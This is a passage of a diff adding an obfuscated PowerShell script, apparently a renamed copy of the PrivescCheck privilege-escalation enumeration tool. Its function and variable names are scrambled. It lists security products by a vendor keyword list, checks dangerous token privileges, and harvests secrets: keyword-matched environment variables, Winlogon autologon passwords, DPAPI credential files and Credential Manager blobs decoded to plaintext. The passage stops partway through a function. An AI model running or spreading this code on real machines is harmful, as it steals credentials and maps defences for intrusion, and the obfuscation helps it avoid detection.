+                    $FFwUnnCu99 = [IntPtr] ($FFwUnnCu99.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($hJDgYRWc99))
+                }
+    
+                [PrivescCheck.Win32]::WlanFreeMemory($tkVGjcWq99)
+    
+            } else {
+                Write-Verbose "WlanEnumInterfaces() failed (Err: $($XwsMixSg99))"
+            }
+    
+            $XwsMixSg99 = [PrivescCheck.Win32]::WlanCloseHandle($qPEdrjNB99, [IntPtr]::Zero)
+            if ($XwsMixSg99 -eq $rltZTwCq99) {
+                Write-Verbose "WlanCloseHandle() OK"
+            } else {
+                Write-Verbose "WlanCloseHandle() failed (Err: $($XwsMixSg99))"
+            }
+    
+        } else {
+            Write-Verbose "WlanOpenHandle() failed (Err: $($XwsMixSg99))"
+        }
+    } catch {
+    }
+}
+function sportscast {
+    
+    [CmdletBinding()] param()
+    $TuKhSHpP99 = ""
+    $QGgQyZuh99 = [System.Environment]::OSVersion.Version
+    $Item = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
+    if (-not $EXIfkazW99) {
+        $TuKhSHpP99 = $Item.ProductName
+        if ($QGgQyZuh99 -like "10.*") {
+            $QGgQyZuh99 = "$($Item.CurrentMajorVersionNumber).$($Item.CurrentMinorVersionNumber).$($Item.CurrentBuild) Version $($Item.ReleaseId) ($($Item.CurrentBuild).$($Item.UBR))"
+        } 
+        $MfROBanQ99 = New-Object -TypeName PSObject
+        $MfROBanQ99 | Add-Member -MemberType NoteProperty -Name "Name" -Value $TuKhSHpP99
+        $MfROBanQ99 | Add-Member -MemberType NoteProperty -Name "Version" -Value $QGgQyZuh99
+        $MfROBanQ99
+    } else {
+        Write-Verbose $EXIfkazW99
+    }
+}
+function cheapskate {
+    
+    [CmdletBinding()] param(
+        [int]
+        $cYXGwhki99 = 31
+    )
+    try {
+        $EYDFKKKs99 = New-Object -TypeName System.Collections.ArrayList
+        $NgYmTzLe99 = (Get-Date).AddDays(-$cYXGwhki99)
+        $hBBGyEXb99 = Get-Date
+        $OHBBGxsE99 = Get-EventLog -LogName "System" -EntryType "Information" -After $NgYmTzLe99 -Before $hBBGyEXb99 | Where-Object {$_.EventID -eq 6005}
+        $vPpNLhvK99 = 1
+        ForEach ($Event in $OHBBGxsE99) {
+            $sDsVSSje99 = New-Object -TypeName PSObject 
+            $sDsVSSje99 | Add-Member -MemberType "NoteProperty" -Name "Index" -Value $vPpNLhvK99
+            $sDsVSSje99 | Add-Member -MemberType "NoteProperty" -Name "Time" -Value "$(tremolos -Date $Event.TimeGenerated)"
+            [void]$EYDFKKKs99.Add($sDsVSSje99)
+            $vPpNLhvK99 += 1
+        }
+        $EYDFKKKs99 | Select-Object -First 10
+    } catch {
+        Write-Verbose "Error while querying the Event Log."
+    }
+}
+function pervades {
+    
+    [CmdletBinding()] param() 
+    try {
+        $VrFGRhuR99 = [PrivescCheck.Win32]::GetTickCount64()
+        $AgjgHfRS99 = (Get-Date).AddMilliseconds(-$VrFGRhuR99)
+        $AvLmOoyJ99 = New-Object -TypeName PSObject
+        $AvLmOoyJ99 | Add-Member -MemberType "NoteProperty" -Name "Time" -Value "$(tremolos -Date $AgjgHfRS99)"
+        $AvLmOoyJ99
+    
+    } catch {
+    }
+}
+function downsizing {
+    
+    [CmdletBinding()] param()
+    $MVhgRUNl99 = New-Object -TypeName System.Collections.ArrayList
+    $fxNwvdMw99 = Get-PSDrive -PSProvider "FileSystem"
+    ForEach ($Drive in $fxNwvdMw99) {
+        $wWwVHuTn99 = New-Object -TypeName PSObject
+        $wWwVHuTn99 | Add-Member -MemberType "NoteProperty" -Name "Root" -Value "$($Drive.Root)"
+        $wWwVHuTn99 | Add-Member -MemberType "NoteProperty" -Name "DisplayRoot" -Value "$($Drive.DisplayRoot)"
+        $wWwVHuTn99 | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "$($Drive.Description)"
+        [void]$MVhgRUNl99.Add([object]$wWwVHuTn99)
+    }
+    $MVhgRUNl99
+}
+function Java {
+    [CmdletBinding()] param()
+    function timber {
+        param(
+            $AyZsGxTH99
+        )
+        $SOFSrDgO99 = @{
+            "ADS_UF_SCRIPT" = "1";
+            "ADS_UF_ACCOUNTDISABLE" = "2";
+            "ADS_UF_HOMEDIR_REQUIRED" = "8";
+            "ADS_UF_LOCKOUT" = "16";
+            "ADS_UF_PASSWD_NOTREQD" = "32";
+            "ADS_UF_PASSWD_CANT_CHANGE" = "64";
+            "ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED" = "128";
+            "ADS_UF_TEMP_DUPLICATE_ACCOUNT" = "256";
+            "ADS_UF_NORMAL_ACCOUNT" = "512";
+            "ADS_UF_INTERDOMAIN_TRUST_ACCOUNT" = "2048";
+            "ADS_UF_WORKSTATION_TRUST_ACCOUNT" = "4096";
+            "ADS_UF_SERVER_TRUST_ACCOUNT" = "8192";
+            "ADS_UF_DONT_EXPIRE_PASSWD" = "65536";
+            "ADS_UF_MNS_LOGON_ACCOUNT" = "131072";
+            "ADS_UF_SMARTCARD_REQUIRED" = "262144";
+            "ADS_UF_TRUSTED_FOR_DELEGATION" = "524288";
+            "ADS_UF_NOT_DELEGATED" = "1048576";
+            "ADS_UF_USE_DES_KEY_ONLY" = "2097152";
+            "ADS_UF_DONT_REQUIRE_PREAUTH" = "4194304";
+            "ADS_UF_PASSWORD_EXPIRED" = "8388608";
+            "ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION" = "16777216";
+        }
+        $SOFSrDgO99.GetEnumerator() | ForEach-Object { 
+            if ( $_.value -band $AyZsGxTH99 ) 
+            {
+                $_.name
+            }
+        }
+    }
+    function epithets {
+        param(
+            $RNQNPSRP99
+        )
+        $jhtRhoaE99 = @{
+            "ADS_GROUP_TYPE_BUILTIN_LOCAL_GROUP" = "1"; # Specifies a group that is created by the system.
+            "ADS_GROUP_TYPE_ACCOUNT_GROUP" = "2"; # Specifies a global group.
+            "ADS_GROUP_TYPE_RESOURCE_GROUP" = "4"; # Specifies a domain local group.
+            "ADS_GROUP_TYPE_UNIVERSAL_GROUP" = "8"; # Specifies a universal group.
+            "ADS_GROUP_TYPE_APP_BASIC_GROUP" = "16";
+            "ADS_GROUP_TYPE_APP_QUERY_GROUP" = "32";
+            "ADS_GROUP_TYPE_SECURITY_ENABLED" = "2147483648"; # Specifies a security-enabled group.
+        }
+        $jhtRhoaE99.GetEnumerator() | ForEach-Object { 
+            if ($_.value -band $RNQNPSRP99) 
+            {
+                $_.name
+            }
+        }
+    }
+    $izynGuBd99 = "S-1-5-32-544" # Local admin group SID 
+    $LrTJEtCT99 = ([Security.Principal.SecurityIdentifier]$izynGuBd99).Translate([Security.Principal.NTAccount]).Value
+    $gYujIQAn99 = $LrTJEtCT99.Split('\')[1]
+    $UYJzbeed99 = $env:COMPUTERNAME
+    $HjelMVoM99 = [ADSI]("WinNT://$UYJzbeed99,computer") 
+    try {
+        $qydBtPGY99 = $HjelMVoM99.psbase.children.find($gYujIQAn99, "Group") 
+        if ($qydBtPGY99) {
+            $qydBtPGY99.psbase.invoke("members") | ForEach-Object {
+                
+                $rhmIAjyp99 = $_.GetType().InvokeMember("Name",  'GetProperty',  $null,  $_, $null)
+                $pvNBINOU99 = $Null
+                $HjelMVoM99.Children | Where-Object { $_.SchemaClassName -eq "User" } | ForEach-Object {
+                    if ($_.Name -eq $rhmIAjyp99) {
+                        Write-Verbose "Found user: $rhmIAjyp99"
+                        $pvNBINOU99 = $_
+                    } 
+                }
+                if (-not $BZwNyRvl99) {
+                    $HjelMVoM99.Children | Where-Object { $_.SchemaClassName -eq "Group" } | ForEach-Object {
+                        if ($_.Name -eq $rhmIAjyp99) {
+                            Write-Verbose "Found group: $rhmIAjyp99"
+                            $pvNBINOU99 = $_
+                        }
+                    }
+                }
+                if ($pvNBINOU99) {
+                    if ($pvNBINOU99.SchemaClassName -eq "User") {
+                        $AyZsGxTH99 = $pvNBINOU99.UserFlags.value
+                        $Flags = timber $AyZsGxTH99 
+                        $ytlEaOhY99 = "User"
+                        $BJgDCMHy99 = $True
+                        $KVtYDddg99 = $(-not ($Flags -contains "ADS_UF_ACCOUNTDISABLE"))
+                    } elseif ($pvNBINOU99.SchemaClassName -eq "Group") {
+                        $ELRRlXEL99 = $pvNBINOU99.groupType.value
+                        $Flags = epithets $ELRRlXEL99
+                        $ytlEaOhY99 = "Group"
+                        $BJgDCMHy99 = $($Flags -contains "ADS_GROUP_TYPE_RESOURCE_GROUP")
+                        $KVtYDddg99 = $True 
+                    }
+                } else {
+                    $ytlEaOhY99 = ""
+                    $BJgDCMHy99 = $False
+                    $KVtYDddg99 = $Null 
+                }
+                $OMSAXyOD99 = New-Object -TypeName PSObject 
+                $OMSAXyOD99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $rhmIAjyp99
+                $OMSAXyOD99 | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $ytlEaOhY99
+                $OMSAXyOD99 | Add-Member -MemberType "NoteProperty" -Name "IsLocal" -Value $BJgDCMHy99  
+                $OMSAXyOD99 | Add-Member -MemberType "NoteProperty" -Name "IsEnabled" -Value $KVtYDddg99 
+                $OMSAXyOD99
+            }
+        } 
+    } catch {
+        Write-Verbose $_.Exception
+    }
+}
+function battle {
+    [CmdletBinding()] param()
+    
+    $RjzFllrd99 = Join-Path -Path $((Get-Item $env:windir).Root) -ChildPath Users
+    Get-ChildItem -Path $RjzFllrd99 | ForEach-Object {
+        $HpjSMehU99 = $_.FullName
+        $JnIzFPvM99 = $False
+        $lQVurkRa99 = $False
+        $Null = Get-ChildItem -Path $HpjSMehU99 -ErrorAction SilentlyContinue -ErrorVariable ErrorGetChildItem 
+        if (-not $hmUhMoHB99) {
+            $JnIzFPvM99 = $True 
+            $kMUMMuUD99 = $HpjSMehU99 | ruined -loyqyiRW99
+            if (([object[]]$kMUMMuUD99).Length -gt 0) {
+                $lQVurkRa99 = $True
+            }
+        }
+        $cZOxRCjj99 = New-Object -TypeName PSObject 
+        $cZOxRCjj99 | Add-Member -MemberType "NoteProperty" -Name "HomeFolderPath" -Value $HpjSMehU99
+        $cZOxRCjj99 | Add-Member -MemberType "NoteProperty" -Name "Read" -Value $JnIzFPvM99
+        $cZOxRCjj99 | Add-Member -MemberType "NoteProperty" -Name "Write" -Value $lQVurkRa99
+        $cZOxRCjj99
+    }
+}
+function pita {
+    
+    [CmdletBinding()] param()
+    $iaCYZiSc99 = New-Object -TypeName PSObject 
+    $Item = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
+    
+    $kkSKjQGQ99 = @{
+        "WinNT" = "WorkStation";
+        "LanmanNT" = "Domain Controller";
+        "ServerNT" = "Server";
+    }
+    if (-not $EXIfkazW99){
+        try {
+            $iaCYZiSc99 = New-Object -TypeName PSObject
+            $iaCYZiSc99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Item.ProductType
+            $iaCYZiSc99 | Add-Member -MemberType "NoteProperty" -Name "Role" -Value $kkSKjQGQ99[$Item.ProductType]
+            $iaCYZiSc99 
+        } catch {
+            Write-Verbose "Hashtable error."
+        }
+    }
+}
+function fathomed {
+    
+    [CmdletBinding()] param()
+    try {
+        $lcLJUeuA99 = (New-Object -ComObject "Microsoft.Update.AutoUpdate").Results
+        if ($lcLJUeuA99.LastInstallationSuccessDate) {
+            $hIYbpEGl99 = New-Object -TypeName PSObject 
+            $hIYbpEGl99 | Add-Member -MemberType "NoteProperty" -Name "Time" -Value $(tremolos -Date $lcLJUeuA99.LastInstallationSuccessDate)
+            $hIYbpEGl99 | Add-Member -MemberType "NoteProperty" -Name "TimeRaw" -Value $lcLJUeuA99.LastInstallationSuccessDate
+            $hIYbpEGl99
+        } 
+    } catch {
+        Write-Verbose "Error while requesting COM object Microsoft.Update.AutoUpdate."
+    }
+}
+function jawbone {
+    [CmdletBinding()] param()
+    thy | Sort-Object -Property "InstalledOn" -Descending
+}
+function excuse {
+    [CmdletBinding()] param()
+    $qXTvvLgB99 = thy | Sort-Object -Property "InstalledOn" -Descending
+    if ($(([object[]]$qXTvvLgB99).Length) -gt 0) {
+        $MysprhNe99 = $qXTvvLgB99 | Select-Object -First 1
+        $BBUxFwgX99 = New-TimeSpan -Start $MysprhNe99.InstalledOn -End $(Get-Date)
+        if ($BBUxFwgX99.TotalDays -gt 31) {
+            $MysprhNe99
+        } else {
+            Write-Verbose "At least one hotfix was installed in the last 31 days."
+        }
+    } else {
+        Write-Verbose "The hotfix history is empty."
+    }
+}
+function inconsistently {
+    [CmdletBinding()] param()
+    $EcvBzTpa99 = @{
+        "AMSI"                          = "amsi.dll"
+        "AppSense"                      = "emcoreservice,emsystem,watchdogagent"
+        "Avast"                         = "avast"
+        "Avecto Defendpoint"            = "avecto,defendpoint,pgeposervice,pgsystemtray,privilegeguard"
+        "Carbon Black"                  = "carbon,cb.exe,logrhythm"
+        "Cisco AMP"                     = "ciscoamp"
+        "CounterTack"                   = "countertack"
+        "CrowdStrike"                   = "crowdstrike,csagent,csfalcon,csshell,windowssensor"
+        "Cybereason"                    = "activeconsole,cramtray,crssvc,cybereason"
+        "Cylance"                       = "cylance,cyoptics,cyupdate"
+        "Endgame"                       = "endgame"
+        "ESET Endpoint Inspector"       = "inspector"
+        "eTrust EZ AV"                  = "groundling"
+        "FireEye"                       = "fireeye,mandiant,xagt"
+        "ForeScout"                     = "forescout,secureconnector"
+        "IBM QRadar"                    = "qradar,wincollect"
+        "Ivanti"                        = "ivanti"
+        "Kaspersky"                     = "kaspersky"
+        "Lacuna"                        = "lacuna"
+        "McAfee"                        = "mcafee"
+        "Morphisec"                     = "morphisec"
+        "Program Protector"             = "protectorservice"
+        "Red Canary"                    = "canary"
+        "Red Cloak"                     = "procwall,redcloak,cyclorama"
+        "SentinelOne"                   = "sentinel"
+        "Sophos"                        = "sophos"
+        "Symantec Endpoint Protection"  = "eectrl,semlaunchsvc,sepliveupdate,sisidsservice,sisipsservice,sisipsutil,smc.exe,smcgui,snac64,srtsp,symantec,symcorpui,symefasi"
+        "Sysinternals Antivirus"        = "sysinternal"
+        "Sysinternals Sysmon"           = "sysmon"
+        "Tanium Enforce"                = "tanium,tpython"
+        "Traps"                         = "cyvera,cyserver,cytray,PaloAltoNetworks,tda.exe,tdawork"
+        "Trend Micro"                   = "ntrtscan,tmlisten,tmbmsrv,tmssclient,tmccsf,trend"
+        "Windows Defender"              = "defender,msascuil,msmpeng,nissrv,securityhealthservice"
+    }
+    function drowsy {
+        param(
+            [object]$Object
+        )
+        $EcvBzTpa99.Keys | ForEach-Object {
+            $NXUCxzHm99 = $_
+            $OnofMfKr99 = $EcvBzTpa99.Item($_).Split(",")
+            $Object | Select-String -Pattern $OnofMfKr99 -AllMatches | ForEach-Object {
+                $($_ -Replace "@{").Trim("}").Split(";") | ForEach-Object {
+                    $_.Trim() | Select-String -Pattern $OnofMfKr99 -AllMatches | ForEach-Object {
+                        $oUhuvvAp99 = New-Object -TypeName PSObject 
+                        $oUhuvvAp99 | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$NXUCxzHm99"
+                        $oUhuvvAp99 | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_)"
+                        $oUhuvvAp99
+                    }
+                }
+            }
+        }
+    }
+    $drfHofaO99 = New-Object System.Collections.ArrayList
+    
+    Get-Process -Id $PID -Module | ForEach-Object {
+        if (Test-Path -Path $_.FileName) {
+            $HYBwNnsg99 = (Get-Item $_.FileName).VersionInfo | Select-Object -Property CompanyName,FileDescription,FileName,InternalName,LegalCopyright,OriginalFileName,ProductName
+            drowsy -Object $HYBwNnsg99 | ForEach-Object {
+    
+                $XwsMixSg99 = New-Object -TypeName PSObject
+                $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$($_.ProductName)"
+                $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Source" -Value "Loaded DLL"
+                $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_.Pattern)"
+                [void] $drfHofaO99.Add($XwsMixSg99)
+            }
+        }
+    }
+    Get-Process | Select-Object -Property ProcessName,Name,Path,Company,Product,Description | ForEach-Object {
+        drowsy -Object $_ | ForEach-Object {
+            $XwsMixSg99 = New-Object -TypeName PSObject
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$($_.ProductName)"
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Source" -Value "Running process"
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_.Pattern)"
+            [void] $drfHofaO99.Add($XwsMixSg99)
+        }
+    }
+    ampere | Select-Object -Property Name | ForEach-Object {
+        drowsy -Object $_ | ForEach-Object {
+            $XwsMixSg99 = New-Object -TypeName PSObject
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$($_.ProductName)"
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Source" -Value "Installed application"
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_.Pattern)"
+            [void] $drfHofaO99.Add($XwsMixSg99)
+        }
+    }
+    booty -AJMSSkMr99 1 | ForEach-Object {
+        drowsy -Object $_ | ForEach-Object {
+            $XwsMixSg99 = New-Object -TypeName PSObject
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$($_.ProductName)"
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Source" -Value "Service"
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_.Pattern)"
+            [void] $drfHofaO99.Add($XwsMixSg99)
+        }
+    }
+    $drfHofaO99 | Sort-Object -Property ProductName,Source
+}
+function nursing {
+    
+    [CmdletBinding()] param()
+    
+    $wFqXfgIk99 = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    $jNHwVoSf99 = New-Object -TypeName PSObject 
+    $jNHwVoSf99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $wFqXfgIk99.Name 
+    $jNHwVoSf99 | Add-Member -MemberType "NoteProperty" -Name "SID" -Value $wFqXfgIk99.User 
+    $jNHwVoSf99
+}
+function kitchenware {
+    
+    [CmdletBinding()] param()
+    $eLVTXKoB99 = @(
+        "S-1-0",            # Null Authority
+        "S-1-0-0",          # Nobody
+        "S-1-1",            # World Authority
+        "S-1-1-0",          # Everyone
+        "S-1-2",            # Local Authority
+        "S-1-2-0",          # Local
+        "S-1-2-1",          # CONSOLE_LOGON
+        "S-1-3",            # Creator Authority
+        "S-1-3-0",          # Creator Owner
+        "S-1-3-1",          # Creator Group
+        "S-1-3-2",          # OWNER_SERVER
+        "S-1-3-3",          # GROUP_SERVER
+        "S-1-3-4",          # Owner Rights
+        "S-1-5-80-0",       # NT Services\All Services
+        "S-1-5",            # NT Authority
+        "S-1-5-1",          # Dialup
+        "S-1-5-2",          # Network
+        "S-1-5-3",          # Batch
+        "S-1-5-4",          # Interactive
+        "S-1-5-6",          # Service
+        "S-1-5-7",          # Anonymous
+        "S-1-5-8",          # PROXY
+        "S-1-5-10",         # Principal Self
+        "S-1-5-11",         # Authenticated Users
+        "S-1-5-12",         # Restricted Code
+        "S-1-5-15",         # THIS_ORGANIZATION
+        "S-1-5-17",         # This Organization
+        "S-1-5-18",         # Local System 
+        "S-1-5-19",         # Local Service
+        "S-1-5-20",         # Network Service
+        "S-1-5-32-545",     # Users
+        "S-1-5-32-546",     # Guests
+        "S-1-5-32-554",     # Builtin\Pre-Windows 2000 Compatible Access
+        "S-1-5-80-0",       # NT Services\All Services
+        "S-1-5-83-0",       # NT Virtual Machine\Virtual Machines
+        "S-1-5-113",        # LOCAL_ACCOUNT
+        "S-1-5-1000",       # OTHER_ORGANIZATION
+        "S-1-15-2-1"        # ALL_APP_PACKAGES
+    ) 
+    $JbPGONfP99 = @(
+        "S-1-5-21-*-513",   # Domain Users
+        "S-1-5-21-*-514",   # Domain Guests
+        "S-1-5-21-*-515",   # Domain Computers
+        "S-1-5-21-*-516",   # Domain Controllers
+        "S-1-5-21-*-545",   # Users
+        "S-1-5-21-*-546",   # Guests
+        "S-1-5-64-*",       # NTLM / SChannel / Digest Authentication
+        "S-1-16-*",         # Integrity levels 
+        "S-1-15-3-*",       # Capabilities ("Active Directory does not resolve capability SIDs to names. This behavior is by design.")
+        "S-1-18-*"          # Identities
+    )
+    
+    $wFqXfgIk99 = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    $WEdXCHrs99 = $wFqXfgIk99.Groups 
+    ForEach ($Group in $WEdXCHrs99) {
+        $JBQkDJVU99 = $Group.Value 
+        if (-not ($eLVTXKoB99 -contains $JBQkDJVU99)) {
+            $adaueToF99 = $False 
+            ForEach ($HdULgKxJ99 in $JbPGONfP99) {
+                if ($JBQkDJVU99 -like $HdULgKxJ99) {
+                    Write-Verbose "Known SID pattern: $JBQkDJVU99"
+                    $adaueToF99 = $true
+                    break   
+                }
+            }
+            if (-not $adaueToF99) {
+                try {
+                    $JbkRFxYH99 = ($Group.Translate([System.Security.Principal.NTAccount])).Value
+                } catch {
+                    $JbkRFxYH99 = "N/A"
+                }
+                $TlFnvTlu99 = New-Object -TypeName PSObject 
+                $TlFnvTlu99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $JbkRFxYH99 
+                $TlFnvTlu99 | Add-Member -MemberType "NoteProperty" -Name "SID" -Value $JBQkDJVU99
+                $TlFnvTlu99
+            }
+        } else {
+            Write-Verbose "Known SID: $JBQkDJVU99"
+        }
+    }
+}
+function repercussion {
+    [CmdletBinding()] param()    
+    $QJJcDqHw99 = "SeAssignPrimaryTokenPrivilege", "SeImpersonatePrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeLoadDriverPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeBackupPrivilege", "SeManageVolumePrivilege"
+    $QEckTHVb99 = etymology
+    ForEach ($DKrgNeIZ99 in $QEckTHVb99) {
+        if ($QJJcDqHw99 -contains $DKrgNeIZ99.Name) {
+            $DKrgNeIZ99
+        }
+    }
+}
+function calls {
+    [CmdletBinding()] param() 
+    [string[]] $xsYjRLrv99 = "key", "passw", "secret", "pwd", "creds", "credential", "api"
+    Get-ChildItem -Path env: | ForEach-Object {
+        $vqPxuRQS99 = $_.Name
+        $pQqWPkMH99 = $_.Value 
+        $nLSHbAiW99 = "$($_.Name) $($_.Value)"
+        
+        ForEach ($XQMQHynl99 in $xsYjRLrv99) {
+            if ($nLSHbAiW99 -Like "*$($XQMQHynl99)*") {
+                $saszGFQU99 = New-Object -TypeName PSObject 
+                $saszGFQU99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $vqPxuRQS99
+                $saszGFQU99 | Add-Member -MemberType "NoteProperty" -Name "Value" -Value $pQqWPkMH99
+                $saszGFQU99 | Add-Member -MemberType "NoteProperty" -Name "Keyword" -Value $XQMQHynl99
+                $saszGFQU99
+            }
+        }
+    }
+}
+function fix {
+    [CmdletBinding()] param()
+    $XtIMwCTj99 = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+    $Item = Get-ItemProperty -Path $XtIMwCTj99 -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
+    if (-not $EXIfkazW99) {
+        if ($Item.DefaultPassword) {
+            $CUnVJMnx99 = New-Object -TypeName PSObject 
+            $CUnVJMnx99 | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $Item.DefaultDomainName
+            $CUnVJMnx99 | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $Item.DefaultUserName
+            $CUnVJMnx99 | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Item.DefaultPassword
+            $CUnVJMnx99
+        } 
+    
+        if ($Item.AltDefaultPassword) {
+            $CUnVJMnx99 = New-Object -TypeName PSObject 
+            $CUnVJMnx99 | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $Item.AltDefaultDomainName
+            $CUnVJMnx99 | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $Item.AltDefaultUserName
+            $CUnVJMnx99 | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Item.AltDefaultPassword
+            $CUnVJMnx99
+        }
+    } else {
+        Write-Verbose "Error while querying '$XtIMwCTj99'"
+    }
+}
+function frenetic {
+    
+    [CmdletBinding()] param()
+    $gEvdcUUi99 = $False
+    $Paths = New-Object -TypeName System.Collections.ArrayList
+    [void] $Paths.Add($(Join-Path -Path $env:LOCALAPPDATA -ChildPath "Microsoft\Credentials"))
+    [void] $Paths.Add($(Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Credentials"))
+    ForEach ($Path in [string[]]$Paths) {
+        Get-ChildItem -Force -Path $Path -ErrorAction SilentlyContinue | ForEach-Object {
+            $XwsMixSg99 = New-Object -TypeName PSObject 
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Credentials"
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $_.FullName
+            $XwsMixSg99
+            if (-not $gEvdcUUi99) { $gEvdcUUi99 = $True }
+        }
+    }
+    if ($gEvdcUUi99) {
+        $wFqXfgIk99 = nursing
+        if ($wFqXfgIk99 -and $wFqXfgIk99.SID) {
+    
+            $Paths = New-Object -TypeName System.Collections.ArrayList
+            [void] $Paths.Add($(Join-Path -Path $env:LOCALAPPDATA -ChildPath "Microsoft\Protect\$($wFqXfgIk99.SID)"))
+            [void] $Paths.Add($(Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Protect\$($wFqXfgIk99.SID)"))
+    
+            ForEach ($Path in [string[]]$Paths) {
+    
+                Get-ChildItem -Force -Path $Path -ErrorAction SilentlyContinue | Where-Object {$_.Name.Length -eq 36 } | ForEach-Object {
+        
+                    $XwsMixSg99 = New-Object -TypeName PSObject 
+                    $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Protect"
+                    $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $_.FullName
+                    $XwsMixSg99
+                }
+            }
+        } 
+    } 
+}
+function sure {
+    
+    [CmdletBinding()] param()
+    function sandwiching {
+        [CmdletBinding()] param(
+            [Uint32]$Type 
+        )
+        $mhAWpykk99 = @{
+            "GENERIC"                   = "1";
+            "DOMAIN_PASSWORD"           = "2";
+            "DOMAIN_CERTIFICATE"        = "3";
+            "DOMAIN_VISIBLE_PASSWORD"   = "4"; #  This value is no longer supported. 
+            "GENERIC_CERTIFICATE"       = "5"; #  This value is no longer supported.
+            "DOMAIN_EXTENDED"           = "6"; #  This value is no longer supported.
+            "MAXIMUM"                   = "7"; #  This value is no longer supported.
+            "TYPE_MAXIMUM_EX"           = "8"; #  This value is no longer supported.
+        }
+    
+        $mhAWpykk99.GetEnumerator() | ForEach-Object { 
+            if ( $_.Value -eq $Type ) 
+            {
+                $_.Name
+            }
+        }
+    }
+    function uncorroborated {
+        [CmdletBinding()] param(
+            [Uint32]$uvRTqRGO99 
+        )
+        $arkzVoFS99 = @{
+            "SESSION" = "1";
+            "LOCAL_MACHINE" = "2";
+            "ENTERPRISE" = "3";
+        }
+        $arkzVoFS99.GetEnumerator() | ForEach-Object { 
+            if ( $_.Value -eq $uvRTqRGO99 ) 
+            {
+                $_.Name
+            }
+        }
+    }
+    function enormous {
+        [CmdletBinding()] param(
+            [PrivescCheck.Win32+CREDENTIAL]$qotFgfjr99
+        )
+        if (-not ($qotFgfjr99.CredentialBlobSize -eq 0)) {
+            $DgwHpTet99 = New-Object -TypeName "PrivescCheck.Win32+UNICODE_STRING"
+            $DgwHpTet99.Length = $qotFgfjr99.CredentialBlobSize
+            $DgwHpTet99.MaximumLength = $qotFgfjr99.CredentialBlobSize
+            $DgwHpTet99.Buffer = $qotFgfjr99.CredentialBlob
+            $ScWYtQrv99 = 2 # IS_TEXT_UNICODE_STATISTICS
+            $OfSwDqup99 = [PrivescCheck.Win32]::IsTextUnicode($DgwHpTet99.Buffer, $DgwHpTet99.Length, [ref]$ScWYtQrv99)
+            
+            if ($OfSwDqup99) {
+                $XwsMixSg99 = [Runtime.InteropServices.Marshal]::PtrToStringUni($DgwHpTet99.Buffer, $DgwHpTet99.Length / 2)
+            } else {
+                for ($i = 0; $i -lt $DgwHpTet99.Length; $i++) {
+                    $WFCjrNwJ99 = [IntPtr] ($DgwHpTet99.Buffer.ToInt64() + $i)
+                    $Byte = [Runtime.InteropServices.Marshal]::ReadByte($WFCjrNwJ99)
+                    $XwsMixSg99 += "{0:X2} " -f $Byte
+                }
+            }
+            $XwsMixSg99
+        }
+    }
+    $Count = 0;
+    [IntPtr]$HVIQaHhr99 = [IntPtr]::Zero
+    $BUBqVtlJ99 = [PrivescCheck.Win32]::CredEnumerate([IntPtr]::Zero, 1, [ref]$Count, [ref]$HVIQaHhr99)
+    $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    if ($BUBqVtlJ99) {
+        Write-Verbose "CredEnumerate() OK - Count: $($Count)"
+        for ($i = 0; $i -lt $Count; $i++) {
+            $DmLfxjkJ99 = [IntPtr] ($HVIQaHhr99.ToInt64() + [IntPtr]::Size * $i)
+            $JaTChMZW99 = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($DmLfxjkJ99) 
